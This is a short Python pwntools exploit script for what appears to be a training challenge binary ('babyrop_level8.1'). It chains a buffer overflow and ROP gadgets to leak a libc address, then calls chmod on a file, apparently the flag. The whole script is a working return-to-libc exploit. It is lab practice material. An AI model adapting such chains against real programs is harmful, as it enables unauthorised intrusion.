from pwn import *

p = process('/challenge/babyrop_level8.1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'
gadget1 = 0x401663      # pop rdi ; ret
gadget2 = 0x401661      # pop rsi ; ret
puts_plt = 0x401090
read_got = 0x404030
string = 0x402004
payload = b'A'*72 + p64(gadget1) + p64(read_got) + p64(puts_plt) + p64(0x401502)
p.send(payload)
p.recvuntil('Leaving!\n')
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - libc.sym['read']
print('[+] Libc base address: '+hex(libc.address))

payload1 = b'B'*72 + p64(gadget1) + p64(string)
payload1 += p64(gadget2) + p64(0x7)*2
payload1 += p64(libc.sym['chmod'])
p.send(payload1)

p.interactive()
